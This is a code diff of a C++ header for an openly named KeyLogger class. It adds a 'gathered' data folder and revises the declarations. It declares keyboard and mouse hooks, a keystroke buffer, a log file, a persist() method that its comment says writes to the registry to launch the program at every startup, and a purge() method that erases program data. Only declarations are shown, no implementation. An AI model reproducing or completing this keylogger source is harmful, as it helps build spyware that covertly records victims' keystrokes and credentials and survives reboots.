@@ -23,6 +23,9 @@
 #define SC_SPACE 57
 #define SC_ENTER 28
 
+//folder to store gathered data
+#define DATADIR "gathered"
+
 class KeyLogger {
 
     public:
@@ -51,7 +54,7 @@ class KeyLogger {
 	void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }
 
 	//writes to registry to make the program launch at every startup
-	void persist(std::string programName);
+	void persist();
 
 	//erases program data
 	void purge();
@@ -83,7 +86,9 @@ class KeyLogger {
     HHOOK khook, mhook;
 	
     std::ofstream logFile;
-	std::string logFilePath;
+
+	std::string programDir;
+	std::string programPath;
 
 	std::string keyboardBuffer;
 
